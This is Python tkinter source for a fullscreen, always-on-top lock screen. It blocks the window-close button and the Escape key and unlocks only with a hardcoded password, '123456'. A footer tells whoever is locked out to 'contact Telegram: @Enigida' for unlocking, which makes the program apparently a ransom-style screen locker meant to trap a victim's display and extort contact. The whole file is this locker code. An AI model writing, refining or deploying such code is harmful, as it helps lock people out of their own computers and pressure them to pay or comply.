import tkinter as tk
from tkinter import messagebox

class LockScreen:
    def __init__(self, root):
        self.root = root
        self.correct_password = "123456"  # Hardcoded password
        self.root.attributes('-fullscreen', True)  # Fullscreen mode
        self.root.title("Lock Screen")
        self.root.configure(bg="#1e1e2e")  # Dark background for modern look

        # Ensure the window stays on top
        self.root.attributes('-topmost', True)

        # Disable Alt+F4
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        # Bind Escape key to prevent exiting
        self.root.bind('<Escape>', lambda e: None)

        # Create a canvas for gradient background
        self.canvas = tk.Canvas(self.root, bg="#1e1e2e", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        # Simulate gradient by drawing rectangles
        self.create_gradient()

        # Create a shadow frame for visual effect
        self.shadow_frame = tk.Frame(self.root, bg="#1c1c2c", bd=0)
        self.shadow_frame.place(relx=0.5, rely=0.5, anchor="center", width=360, height=360)

        # Create a centered frame for the input and button
        self.frame = tk.Frame(self.root, bg="#2e2e3e", bd=2, relief="flat")
        self.frame.place(relx=0.5, rely=0.5, anchor="center", width=350, height=350)

        # Lock icon (simulated with text emoji for simplicity)
        self.lock_icon = tk.Label(
            self.frame,
            text="🔒",
            font=("Helvetica", 40),
            fg="#ffffff",
            bg="#2e2e3e"
        )
        self.lock_icon.pack(pady=10)

        # Title label with adjusted font size and wrapping
        self.label = tk.Label(
            self.frame,
            text="Enter Password to Unlock",
            font=("Helvetica", 18, "bold"),  # Reduced font size
            fg="#ffffff",
            bg="#2e2e3e",
            wraplength=300  # Wrap text to fit within frame
        )
        self.label.pack(pady=10)

        # Password entry
        self.entry = tk.Entry(
            self.frame,
            show="*",
            font=("Helvetica", 18),
            width=20,
            bg="#3e3e4e",
            fg="#ffffff",
            insertbackground="#ffffff",
            relief="flat"
        )
        self.entry.pack(pady=10)
        self.entry.focus_set()  # Set focus to entry

        # Unlock button
        self.button = tk.Button(
            self.frame,
            text="Unlock",
            command=self.check_password,
            font=("Helvetica", 16, "bold"),
            bg="#6200ea",
            fg="#ffffff",
            activebackground="#7f39fb",
            activeforeground="#ffffff",
            relief="flat",
            padx=20,
            pady=10
        )
        self.button.pack(pady=20)

        # Telegram contact label at the bottom
        self.telegram_label = tk.Label(
            self.root,
            text="For unlocking, contact Telegram: @Enigida",
            font=("Helvetica", 14, "italic"),
            fg="#b0b0b0",
            bg="#1e1e2e"
        )
        self.telegram_label.place(relx=0.5, rely=0.95, anchor="center")

        # Bind Enter key to check_password
        self.entry.bind('<Return>', lambda event: self.check_password())

    def create_gradient(self):
        # Simulate a gradient by drawing horizontal lines
        width = self.root.winfo_screenwidth()
        height = self.root.winfo_screenheight()
        for i in range(height):
            # Transition from dark blue to dark purple
            r = int(30 + (i / height) * 20)
            g = int(30 + (i / height) * 20)
            b = int(46 + (i / height) * 60)
            color = f"#{r:02x}{g:02x}{b:02x}"
            self.canvas.create_line(0, i, width, i, fill=color)

    def check_password(self):
        entered_password = self.entry.get()
        if entered_password == self.correct_password:
            self.root.destroy()  # Exit the application
        else:
            messagebox.showerror("Error", "Incorrect Password!")
            self.entry.delete(0, tk.END)  # Clear the entry

if __name__ == "__main__":
    root = tk.Tk()
    app = LockScreen(root)
    root.mainloop()